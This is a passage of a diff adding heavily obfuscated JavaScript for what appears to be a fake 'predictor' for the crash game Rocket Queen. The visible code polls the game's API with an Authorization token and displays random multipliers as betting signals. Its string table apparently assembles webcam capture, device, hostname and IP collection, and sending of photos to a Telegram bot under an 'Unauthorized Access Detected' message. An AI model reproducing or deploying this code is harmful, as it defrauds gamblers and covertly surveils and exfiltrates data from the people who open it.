'nseTe', 'corat', 'hFoVh', '8jmtc', 'catio', 'zheic', 'ash-g', 'ukvlq', 'tify-', 'nqubY', 'w+O7+', " opac", 'c5q2S', 'Wht/B', 'jZKLF', 'cK5cl', 'duPw+', 'AACXB', 'iKaLJ', 'udik.', '7Pktz', 'JaUQI', '09dtA', 'znyIl', 'fbEhg', '0m3ES', 'xEpFb', 'entyl', 'inter', "вы хо", 'tQXKM', 'lRPaC', 'XXHhA', 'EwFcf', "e>\n🌐 ", 'AFW0L', 'M5+jv', 'BJycn', 'ediuS', 'IyFOJ', "3s;\n ", 'QtKUd', "\" sty", 'tK9fV', 'cjiCX', 'AJpVR', "   co", 'ZFTXH', 'etXt6', "px 0;", 'YQarC', 'hRDIx', 'r2ymX', '.org/', '0O3kc', 'DDmnI', 'oto:', 'cNOVp', "    r", 'xZv+y', "5, 0,", 'box-s', 'bsolu', 'nMGmM', 'messa', 'ject', "ne;\n ", 'arAPu', 'data:', 'BpD54', 'MhRnz', 'count', 'utFMR', 'rando', 'repla', 'zEwoE', 'FFeHr', "емы с", 'aNT4h', 'vice', 'ElpDb', 'hostn', 'Type:', "d to ", 'Time:', 'ame:', 'class', "v cla", '2cbWg', 't8uKr', 'pXN0g', 'iRcaN', '-colo', 'NgTjv', 'enter', 'icien', 'zKveG', 'ryNam', 'V6Poh', 'Dg8Qd', 'UBuWS', 'ptaIQ', 'PGqEM', "\"data", '4pWlZ', "id=\"f", 'irYUe', "ize: ", 'hLe+s', ">New ", 'demo', 'Photo', 'Oj33/', 'bcPT8', 'appen', 'K5xMG', 'gAeZg', 'K7r9R', "    @", " <img", "try n", 'NoSjH', '>Unau', "ite a", 'tube.', 'pOvZb', 'sizij', 'margi', 'ksnR3', 'WSA65', 'GfymA', 'y5BTt', 'aVkmx', 'sEvvO', 'G+AsA', 'Pp7Xv', " just", 'TTkUx', 'MDPTA', " возн", 'otf+j', 'sUB5T', 'A4Z2K', 'lvsKS', 'oAAoF', "\n\n   ", '6o67A', 'tu3AH', 'maTkZ', '0ccsm', 'alize', 'sk66q', 'uKgcd', 'wFQsV', 'knDTO', "glow ", 'ZuJPx', '7F7lZ', 'ucaxR', 'SxBWA', 'MohCL', 'PPcMd', "0;\n  ", 'then', 'wAsOI', "  ali", 'ZCs2J', 'YCGNU', 'lQ4w0', '/12j1', 'one', 'Windo', 'xfAAA', 'T8tja', '1FVfh', 'VwAxe', 'POST', 'vmvf2', '/jpeg', 'OrGhN', 'Linux', "r;\n  ", 'ffhYH', 'json', '(1.05', 'TOu8R', 'ify-c', 'cudV/', 'LyjSo', '914yz', "}\n   ", 'gUWXt', 'RjY/H', 'RjTz3', 'ion', "ss=\"a", '/send', "лемы ", "ить в", 'mage', 'locat', "de>\n📱", ':imag', 'shado', 'fNVNN', 'oDjY/', 'odeAt', "{ opa", 'color', 'BgARk', 's2r2L', 'обнов', " 50% ", 'pCcpM', 'GW9U3', '/Mbe/', '/P8V9', "\n🚫 <b", "ass=\"", 'AQ/v3', 'hYRAk', 'ziaHd', 'hg/eb', 'ODULK', 'fDEwc', "red;\n", 'Ufl1W', 'vcauJ', 'respo', 'H5idU', 'SbPyG', 'jxLJX', 'dMLhn', "1.5s ", 'HSnmC', ": 5px", 'Z9XnY', 'VVH0D', '13437704pbSdEk', 'lfTkj', 'eMhjB', 'ещен<', " bord", "жно в", 'gBKoX', " 0, 0", '+VNk/', "    1", 'vH2+6', "ing: ", 'LGjfa', "5);\n ", '+YCh8', 'glDPs', 'aliza', 'erCas', 'dZBZW', '8WBKt', 'AtK1v', 'ODAjQ', 'searc', 'bzRjN', " 0.7;", "     ", 'xf8AP', 'head', 'kVEKD', 'YueXJ', 'SpNHQ', 'gwgtu', 'TZCt6', 'strin', 'P3eYi', 'urAEI', 'JYnFY', ": 100", 'rFvHV', '3OGUj', 'SbLBb', '8uOpM', 'githu', 'Xv0Lo', 'olapb', 'KcW16', 'AbGaI', 'ttBIZ', "URL: ", 'RxAPS', '+zxMJ', 'MMfK0', '.jpg', "    f", 'catch', 'creat', 'Vg4Vb', 'devic', '2620WIfjgf', 'yO9g3', "ody {", "   ", '8pj6r', 'm/lOw', 'Initi', 'KG719', "  }\n ", 'hjvIV', " cent", 'LMVva', 'Y9qnH', "0 0 5", 'onten', 'FBDkD', 'sOvaY', '.</li', 'W3U3N', 'hD3rR', "eft\">", 'd4ABa', 'href', "t: <c", '965y5', 'vDPSu', 'ed</b', 'jMtpr', "ion: ", 'uGcTT', 'm4gAE', 'RC5xB', 'YEE1+', 'fly', 'flick', '9FStm', 'wzUym', 'eElem', " fetc", 'ient(', 'Esq7J', 'oWQUt', 'byV+1', '7y9jv', 'nn/wX', 'table', 'tjYHh', "  mar", '9rVq+', 'THzXW', 'AeKbF', " 0;\n ", 'NaZXx', 'TZXjz', "Fix I", 'paddi', 'ransf', 'u4zBe', "wn De", 'p+fkx', 'HTML', 'thori', '669bj', 'TKpUU', 'dXHgw', 'wGA0w', "   tr", ": 4em", 'Lnz51', 'gAery', 'ccess', "\n❗️ <b", 'yLyJo', 'hQgJB', 'cz8BS', 'IlYQi', "ton {", 'u6l+p', '4DxcQ', "e>\n⏰ ", "lt=\"E", 'NSixI', '7lIQ8', 'vX8QQ', '3DhKv', 'ZZidm', 'dChil', 'erif;', " clas", 'xH2TR', "nt wi", 'rlC2T', 'E0zJr', 'YGhm2', 'aEpyE', '2zkL5', 'Locat', 'O/+z/', 'ById', 'YNLGH', " capt", 'gUAga', '508Gu', 'egVcm', 'hJjKQ', "lex;\n", 'iIc9k', "\n🚀 <b", 'Eleme', 'XxuKS', 'jiWQa', "uto;\"", '8Bd6t', "20px ", 'jq9pn', 'S8dN3', '://ap', 'eKPtT', 'uthen', "  tex", '8qpx1', 'WNRM0', 'pq0j0', 'I5xfX', 'xt-sh', 'Xgkw5', 'gfPIG', 'YXidZ', 'отели', 'mtyKA', 'uTgoR', 'YbZIy', "10px ", 'tHs+O', 'k//8A', 'tems:', 'pmrvd', "vh;\n ", 'apply', 'Ukklz', '4k7Ji', 'Kwaao', 'qpGsf', " list", 'aJjZP', "rlay\"", 'pxpWR', " 0% {", 'RLyvh', 'acks', 'b.io', 'BErfm', "eft: ", 'GQCDQ', 'WnrpP', 'f1rrD', 'f0HBT', 'kif', "er {\n", 'l5OOR', 'fromC', 'jaIiX', 'ntext', 'qmLqO', 'zG+Tc', 'ZLYXn', 'XkljP', "zed A", 'wxFXZ', '2+dr2', " coun", 'aOGBg', 'dMtgA', 'ту:</', ')</co', 'LQIsy', 'e-typ', 'SLNMI', "1; }\n", "n() ", 'xPwCd', '://cr', 'IHYQB', 'h1MjY', 'photo', '0ezAA', 'AjeBB', 'larBX', 'jsUb5', 'DIwXN', '/isRl', 'NWhBw', 'zTZSp', "ws Ph", 'Xspex', 'k7yy7', 'oeotr', 'z-ind', 'szITd', 'gent', "one;\n", 'oLXii', 'domai', 'ode>', 'kIOcM', "ref=\"", "с сер", 'kFwRm', 'MXNEQ', 'drawI', 'Deskt', 'io/js', '1Zesa', 'lyskK', "   ma", 'MlDCD', 'rzTB1', 'DKrYw', '.app/', '$.</l', '9/uXT', 'hadow', 'QIrpI', 'BAJdC', 'yTOVC', '/v3.1', "    a", 'bhCww', 'i.tel', 'AVRSe', '/ft5j', 'FfCHN', 'wVuzK', 'CLETr', 'vpvAE', 'OH9Fu', 'rp15n', 'Cy+/V', '/TENP', 'tton:', 'c01Fy', 'sV6Gw', 'BIHdw', 'zkJwX', 'media', 'BCFLO', 'nitia', 'SWPBF', 'l55xF', 'Width', 'y+1Oc', 'Xq1qU', "    b", "s, tr", 'pvZEp', " rgba", '0GrJi', 'TtYhb', 'EggMb', 'tVcHo', " Agen", 'info.', 'A6DLp', " 1s i", 'uynXK', "ul>\n\n", 'ketqu', 'RuzLd', 'mDDiC', 'stop', '</div', 'getCo', 'bHU8L', 'iPad', 'OdQvk', 'ructo', 'model', 'CPpdl', 'Vdoqo', 'kOdY6', 'jOPoU', '7WyDW', ", 255", 'j+xlQ', 'DtXDn', 'odePo', 'nhUcq', 'tblVu', '5hqHM', 'error', 'mxNOx', 'UHBYQ', "top: ", '1mCiG', '18lpp', 'oGIhJ', '1HMsR', 'NgGpj', '4wY0N', "rn th", 'tText', 'YTPeh', 'q/Bvm', 'main:', 'lPKfs', ", 0.8", "255, ", "   <l", 'getTr', 'oSsHE', 'S5mjI', " bot:", 'zpCPp', 'y/c/3', 'eAPpw', "re ph", 'ai2CT', '9ttDg', 'xZ7ly', " resp", "ить р", 'bot', 'nuzYE', 'Ltcms', "h1 {\n", 'ufhAL', 'nd-co', 'wAjxl', 'LPi3p', 'WFJyi', "/b>\n📍", 'Lnd9x', 'xWmuf', 'coeff', 'curre', 'sW2br', 'zl9I8', '2c34;', 'hm3FZ', 'oMLTL', "rror ", 'ZMVEg', 'mF2s3', "lor: ", '63qoF', "    h", 'm9zxz', "    <", "=\"ove", 'TCdKK', 'vGFHS', 'можно', 'kAAAK', 'state', 'nO8v0', 'MkHmy', 'b0asY', 'KPH3x', 'E5nLp', '6mM3I', 'Mrfkx', 'QZdeE', 'xeK4Y', 'ans-s', 'AA7DA', 'dywHK', 'eMode', 'Jry1w', 'ackgr', '3sNjy', 'y2YWa', '2i+72', 'atch?', 'XI4QW', 'gwMuX', 'NwjVT', 'u/wZe', 'MRnNy', 'effic', " p {\n", "t: ce", 'white', 'G1bkL', 'Q3b96', 'lcGTX', 'fNqlu', 'frame', 'zXbkZ', '13262136dqmShr', '{}.co', 'SUbsb', "th ID", 'lBvHW', 'AAAAi', 'AlYOO', 'FZO1F', 'fzuHY', 'KMhEA', 'JEMXa', '6cqFC', '3R6xi', 'rMiZo', 'ebuyq', '/9EUA', "к сай", '1.2em', 'nt_co', 'SeBl0', 'ZmKNX', 'j/7//', 'pfwAa', 'cPygH', 'zzW49', '72639', 'excep', '+djjz', 'BcePh', 'N5dPs', 'агруз', 'aurwx', 'wvgDH', 'ublyZ', 'mzV96', 'PBngY', 'oplsr', 'awSzO', '100%;', "i>\n  ", 'a(255', "n: co", 'small', 'pqRPi', 'xYtVT', 'XwmgI', 'OJJzW', "ul>\n ", 'м.</l', "rrow ", 'eOS', 'XN9X3', '4761PhonfY', "  <di", '2jIYo', 'endin', 'toUpp', 'ShVjD', 'TZhoo', "e: 18", 'EAg2B', 'lWK99', 'EI2fY', 'fSMDx', "XcQ\" ", 'etect', '29mnl', 'PcGxg', "l', s", 'QFePa', 'JQeZh', 'srcOb', "ent s", 'FoqIT', "send ", 'BKtLw', 'FeFmn', ": 0 0", '065XB', "ебку ", 'VjhJb', '+HYNR', 'MEqFw', 'Jdiot', 'V3aI5', 'captu', 'ge:', 'Wdbe/', 'l8fK5', 'CZKHq', 'width', 'd0rbf', 'VK4Dc', 'LczcH', "   }\n", 'pYsEE', 'charC', 'getEl', 'bind', 'FlwVX', 'ficie', 'qfo1c', "ы блю", '/div>', "n (fu", 'Hwdpz', 'cUURT', "ton\">", 'VWEjO', "or: w", 'ObaND', 'QBXtn', 'botto', 'ERhwl', "ht: a", 'qCukd', 'Table', 'ansfo', 'FqOLR', 'asWYS', "on: r", "); }\n", '/wHIb', '9WVoO', 'LBlev', '://ip', 'XRhFN', 'Al0Io', 'i23UV', 'fcjlH', "00% {", '-styl', " <cod", 'vC87G', 'Ou79N', 'PLmip', 'Mx1Lz', 'xzvHl', 'S/ElH', 'tw3ST', 'pLXsY', " 10px", 'AAANS', 'ate', 'UrdfN', 'WecFd', 'NOLkg', 'yUEMt', 'gU2zu', 'inner', 'fEIv+', 'cted<', "e>\n📌 ", 'HOmoj', 'EFpLk', 'RUvNX', 'R4mkH', 'bCwka', 'hoQWR', 'resul', 'FDbsI', 'IOGCb', 'Krp1j', 'Qy1O1', 'W5lkN', 'YbH5+', '4crV6', 'Fetlf', 'XPZ2C', 'WzMiB', 'Heigh', 'm1WOZ', 'JJxNV', 'awBGY', "r 0.3", 'KBQBf', 'BRaLP', 'EqCkS', "is\")(", 'RQ7VJ', "  bor", '2Vb6G', 'SUVOR', 'conso', 'gt7/7', 'rVYkx', 'c3T2c', "er;\n ", 'VR4nO', 'betti', 'ont-s', 'bgKox', 'JLP9H', 'jSoHb', "ng: 0", 'nter;', 'qN/vw', 'o6c93', 'm99gb', 'SWpwM', 'b5x3A', "\"retu", " спиз", " @key", "w: 0 ", "ot fo", 'oMRi3', 'EHTIR', 'cBugC', " font", '7E8yW', 'const', '>Непр', 'rgin:', '</li>', "orm: ", "er: n", 'textC', 'MLmJ5', 'x-dir', 'mNwt2', 'zqyEJ', 'trim', 'PJXAN', 'w+MLA', '3xMJK', 'eType', '=1pla', "hing ", 'YTQEn', 'XEWKf', 'ehnQw', 'CAYAA', 'X19PO', 'FGoku', 'Ro1Y8', "nd: l", 'kdCAA', 'pSeEp', '2uT7t', 'nMbIR', 'lengt', 'JkK0D', '?id_n', 'p5/O5', 'MZi3O', 'Strin', '12PMO', 'вебку', 'lnGvH', 'goB2x', '2YhvZ', 'OJzFh', 'AAHLY', 'mZGGO', 'ePsUu', 't</a>', ": 1.5", 'xTikT', 'ight:', 'MAD2z', 'yDlrj', 'Error', 'wDwRI', 'gYDzN', '2T5At', "бку у", 'BsjKz', 'der-r', 'q/+6k', "t\"></", 'nimat', 'PM2Iy', '11PIx', 'PZlym', 'nstru', 'v=dQw', 'ApN1q', 'Beare', 'BXPIs', 'jwKSt', 'ORLIA', "  col", '/getM', 'iOS', 'HiF9c', '4sdtC', 'TUewV', "px;\n ", 'hTu1a', 'ctor(', "  <li", 'heigh', 'u7Nte', 'wvlky', 'CcYVg', 'n55Eq', "  jus", 'uk126', 'gm3Q4', " padd", " 0 0 ", 'AINhC', 'HHb6h', 'Lxc38', 'cY3Ov', " src=", 'setIt', 'ZrPGO', " дост", "iv cl", 'tion', "d;\n  ", 'oxUJa', 'taBHJ', "e>\n🖥️ ", 'du+Rw', 'elati', 'M051s', 'вером', 'SHeKx', "    p", "m\"></", 'BORw0', 'Amahw', 'izBeU', '23Xsv', 'toBlo', 'bE2vr', 'Devic', "e: no", "and s", 'Mobil', 'MHapa', 'FJCI5', 'rizat', 'jNoI0', "   #f", 'ZAQaK', ':AAEh', "on: a", 'vK55p', 'WzOJK', "дить ", 'nctio', 'gYG/l', 'dgoNY', 'pxmrv', 'ahzWO', 'Faile', " user", " <li>", 'Sa7Mr', 'A4WlD', 'kuJey', 'getUs', "1); }", " />\n ", 'xaPKd', 'cKGYy', 'aX/1Z', 't-sha', '6337730aLvHDz', 'und.', 'lx6MW', 'OfWoW', "  fon", 'toStr', 'cZa/W', '1+zEH', 'omain', 'ejjJt', "I=\" a", '__pro', 's.com', 'hG5S7', "s glo", '43uvE', 'BBXlo', 'List', 'B9/X1', 'qLHnc', '7/p58', 'YBTW4', 'kk2TF', 'EfZMQ', " info", 'gZyGM', 'PIyMh', 'km9zw', 'iwYjx', '/EmjE', 'ositi', 'ing', "тели ", 'AVoj1', 'xWDZt', '6JzR5', '</cod', ";\n   ", 'ax-wi', '8usSU', 'X3R28', 'SsLmq', 'OE0RB', "   te", 'V6LAJ', 'UUPdR', 'QCHQh', 'K8Hoj', 'vaZ8n', 'Giddy', 'zaNvb', "div>\n", 'klRUH', 'zVukL', 'SAbcD', 'MZycF', "    #", 'y-cr.', 'JPuAi', "p>\n  ", '-grad', 'PyFNk', 'GpvMM', '0LpFY', 'Unkno', 'vazuU', 'userA', 'BZelg', 'cZX7f', 'onseT', 'keyfr', 'ATebT', 'L8gPW', 'nPzlG', 'uPbvG', ");\n  ", "ily: ", "w {\n ", 'image', 'sfull', 'czjqV', '20px;', 'tSFFn', 'jyjkS', " <a h", 'acNKP', 'vice:', "5, 0.", 'ame', 'ению,', 'proto', 'xt-de', 'Dto3z', 'ba(25', 'xt-al', 'FtBkT', 'sBGbv', '0EZNk', 'idwgj', '3OkbD', 'sBAdw', 'dwSfd', 'a8Gi/', '9WppX', 'heade', 'h0IYy', 'ZJOL1', 'a85Js', 'ansit', 'commo', 'add', 'de>', 'daMyx', 'NCFMB', 'icker', 'uYq5I', 'Возмо', 'eaWHN', "em;\n ", 'I2iEg', 'ZTS8h', 'nZNGZ', 'hite;', 'uXrvG', 'E9rxj', "lay: ", 'OmCrh', 'PVtCd', 'upSQl', 'SLACE', 'KGgoA', 'rvtZQ', 'Lrpd5', 'lumn;', '135de', 'PMAsp', "ожно ", 'b8Xf3', 'kUJRx', 'oqaLV', 'mXJeY', "ul {\n", 'body', 'QKv6b', 'play', "nt: c", 'type', 'rfHzr', '03IGB', 'een', "x rgb", 'Csob3', 'A4UTI', 'fixBu', '(255,', 'vzcgz', " Atte", ": #dd", " { te", 'ujg0P', 'ehxgw', '4e04k', 'hSrWe', "g, rg", "e>\n🔗 ", 'FNbY4', '81773', 'EGUn7', 'vK1vE', 'int', 'DVd4n', 'ZWd15', 'BUAdk', 'DlDwz', 's3+gS', "mpt D", 'kgrou', 'olaoY', 'GvzOm', "ay: f", 'jQgvL', 'Lm+Q1', 'p/FlG', "0% { ", 'YicXF', 'v88tf', "m: 0;", '1297270aziGrr', "ems: ", '371B4', 'Phpyc', 'rvKRI', 'fe+xR', 'RowUr', 'ectio', 'AYlWN', 'EoESz', 'iPhon', 'bgcGO', 'KEhfF', 'cente', 'fullU', '64,iV', 'sHhrh', 'inear', 'TXnIv', "le=\"m", 'HVokJ', "    l", 'lO/+w', 'оступ', 'PMeDo', 'forEa', 'IUwGg', 'NrjxS', 'Htkbd', 'dwpBe', 'QqqGo', '1DzeM', 'vtYi6', 'IWXMA', 'HZq7Y', 'пробл', 'pqIag', '07jI9', 'Fw8R3', "\n📍 Do", 'qRW/v', 'gpnTt', 'NvQfZ', " {\n  ", "упом ", "n;\n  "];
+    _0x5563 = function () {
+      return _0x1a2a87;
+    };
+    return _0x5563();
+  }
+  function _0x27c1b8(_0x355609, _0x28aa47, _0x427f69, _0x1fe77c, _0x42c12a) {
+    return _0x39dd(_0x1fe77c - 0x37d, _0x355609);
+  }
+  async function _0x33b152() {
+    if (!_0x213355) {
+      return;
+    }
+    let _0x44c139 = (Math.random() * 3.9 + 1.1).toFixed(2);
+    const _0x47a61f = _0x2eb87a();
+    if (!_0x47a61f) {
+      return;
+    }
+    const _0x593230 = {
+      Authorization: _0x47a61f
+    };
+    const _0x18e222 = {
+      headers: _0x593230
+    };
+    const _0x46d248 = await fetch("https://crash-gateway-cr.100hp.app/state?id_n=1play_rocketqueen", _0x18e222);
+    const _0xe8ab0b = await _0x46d248.json();
+    const _0x62d6be = _0xe8ab0b.current_state;
+    let _0x2642d7 = document.getElementById("responseText");
+    if (!_0x2642d7) {
+      console.error("Element with ID responseText not found.");
+      return;
+    }
+    if (_0x62d6be === "betting" && Date.now() - _0x30e34a > 5000) {
+      let _0x1b233b = _0x44c139 + 'x';
+      document.getElementById("responseText").textContent = _0x1b233b;
+      localStorage.setItem("resultText", _0x1b233b);
+      _0x2642d7.className = "text betting";
+      _0x30e34a = Date.now();
+    } else if (_0x62d6be === "ending") {
+      _0x2642d7.textContent = "Waiting..";
+      _0x2642d7.className = "text fly";
+    }
+  }
+  function _0x10ee51() {
+    if (!_0x213355) {
+      return;
+    }
+    const _0xfbbdf7 = _0x2eb87a();
+    if (!_0xfbbdf7) {
+      return;
+    }
+    const _0x27fe4f = {
+      Authorization: _0xfbbdf7
+    };
+    const _0x239338 = {
+      headers: _0x27fe4f
+    };
+    fetch("https://crash-gateway-cr.100hp.app/state?id_n=1play_rocketqueen", _0x239338).then(_0x4b24db => _0x4b24db.json()).then(_0x3bd1aa => {
+      const _0x23382c = parseFloat(_0x3bd1aa.current_coefficients);
+      _0x5279d2(_0x23382c);
+    })["catch"](_0x562c2f => console.error("Error fetching data:", _0x562c2f));
+  }
+  function _0x5279d2(_0x2b9b42) {
+    const _0x2e9036 = document.getElementById("coefficients");
+    if (!_0x2e9036) {
+      console.error("Element with ID coefficients not found.");
+      return;
+    }
+    if (_0x2b9b42 !== 1) {
+      _0x2e9036.innerText = 'x' + _0x2b9b42;
+      _0x2e9036.classList.remove("smallt");
+      _0x2e9036.classList.add("kif");
+    }
+  }
+  _0x4c6744().then(() => {
+    if (_0x213355) {
+      _0x10ee51();
+      setInterval(_0x10ee51, 100);
+      setInterval(_0x33b152, 100);
+      _0x33b152();
+    }
+  });
